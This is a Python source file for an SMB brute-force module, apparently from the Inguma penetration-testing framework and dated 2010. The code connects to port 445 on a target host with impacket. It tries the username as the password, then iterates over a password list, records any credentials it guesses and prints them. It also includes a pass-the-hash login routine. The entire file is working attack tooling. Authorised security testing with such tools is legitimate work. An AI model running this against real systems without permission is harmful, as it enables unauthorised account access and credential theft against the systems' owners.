#!/usr/bin/python

##      CSmbBrute.py
#       
#       Copyright 2010 Joxean Koret <joxeankoret@yahoo.es>
#       
#       This program is free software; you can redistribute it and/or modify
#       it under the terms of the GNU General Public License as published by
#       the Free Software Foundation; either version 2 of the License, or
#       (at your option) any later version.
#       
#       This program is distributed in the hope that it will be useful,
#       but WITHOUT ANY WARRANTY; without even the implied warranty of
#       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#       GNU General Public License for more details.
#       
#       You should have received a copy of the GNU General Public License
#       along with this program; if not, write to the Free Software
#       Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#       MA 02110-1301, USA.

import os
import sys
import time
import string
from impacket import smb

from lib.module import CIngumaModule

name = "brutesmb"
brief_description = "A simple SMB brute force tool"
type = "gather"

class CSmbBrute(CIngumaModule):

	waitTime = 0
	timeout = 1
	exploitType = 3
	services = ""
	results = {}
	user = ""

	def __init__(self):
		self.smb = None
		self.tid = None
		self.pwd = ''
		self.share = None

	def help(self):
		print "target = <target host or network>"
		print "user = <username>"

	def bruteForce(self):
		userList = [self.user, ]
		self.open(self.target, "445")

		try:
			self.gom.echo( "Trying " + self.user + "/" + self.user )
			self.login(self.user, self.user)
			self.addToDict(self.target + "_passwords", self.user + "/" + self.user)
			self.results[self.user] = self.user
			return True
		except:
			# Well, first try :)
			pass

		for user in userList:
			for passwd in self.getPasswordList():
				time.sleep(self.waitTime)
				try:
					passwd = passwd.replace("\n", "").replace("\r", "")
					self.gom.echo( "Trying " + user + "/" + passwd + "..." )
					self.login(user, passwd)
					sys.stdout.write("\b"  * 80)
					self.addToDict(self.target + "_passwords", self.user + "/" + passwd)
					self.results[user] = passwd

					return True
				except KeyboardInterrupt:
					self.gom.echo( "Aborted." )
					return False
				except:
					pass

		return False

	def run(self):
		if self.target == "":
			self.gom.echo( "No target specified" )
			return False
		
		if self.user == "":
			self.gom.echo( "No user specified" )
			return False

		self.bruteForce()
		return True

	def printSummary(self):
		self.gom.echo( "" )
		for x in self.results:
			self.gom.echo( "[+] User guessed: " + x + "/" + self.results[x] )

	def open(self,host,port):
		self.smb = smb.SMB("*SMBSERVER", host, port)

	def login(self,username, password):
		if not self.smb:
			self.gom.echo( "Open a connection first." )

		self.smb.login(username, password)

	def login_hash(self,username, lmhash, nthash):
		if not self.smb:
			self.gom.echo( "Open a connection first." )

		self.smb.login(username, '', lmhash=lmhash, nthash=nthash)

	def logoff(self):
		if not self.smb:
			self.gom.echo( "Open a connection first." )

		self.smb.logoff()
		self.smb = None

	def close(self):
		if not self.smb:
			self.gom.echo( "Open a connection first." )

		self.smb.close();
